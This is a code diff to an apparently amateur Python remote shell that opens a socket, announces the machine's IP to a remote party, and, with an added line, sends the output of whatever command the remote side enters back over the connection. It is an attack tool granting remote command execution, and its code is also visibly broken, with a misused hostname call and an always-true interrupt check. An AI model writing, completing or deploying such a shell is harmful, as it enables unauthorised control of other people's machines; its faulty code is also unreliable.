@@ -7,6 +7,7 @@ import argparse
 MAX_BUFFER = 4096
 DEFAULT_PORT = 443
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+IP = socket.gethostbyaddr()
 
 def execute_cmd(cmd):
     try:
@@ -18,6 +19,9 @@ def execute_cmd(cmd):
 print(execute_cmd("whoami").decode())
 
 def shell_thread(sock):
+    
+    sock.send(f": ENTER COMMANDS TO EXECUTE : LocalIP_OF_Machine:[{IP}]") #I think im getting the hang outta this.
+
     while True:
         sock.send(b"\r\nEnter Command")
         
@@ -28,8 +32,8 @@ def shell_thread(sock):
             if not buffer or buffer == "exit":
                 print("Exit: Trallalelo Tralala")
         if KeyboardInterrupt:
-            print(b"Keyboard Interrupt: Exiting\n\r")
+            print(b"Keyboard Interrupt: Exiting\r\n")
             break
 
-        print(f"Executing Command {buffer}") #Execute whatever we send., Then return the Output
-        
+        print(f"Executing Command: {buffer}") #Execute whatever we send., Then return the Output
+        sock.send(execute_cmd(buffer))
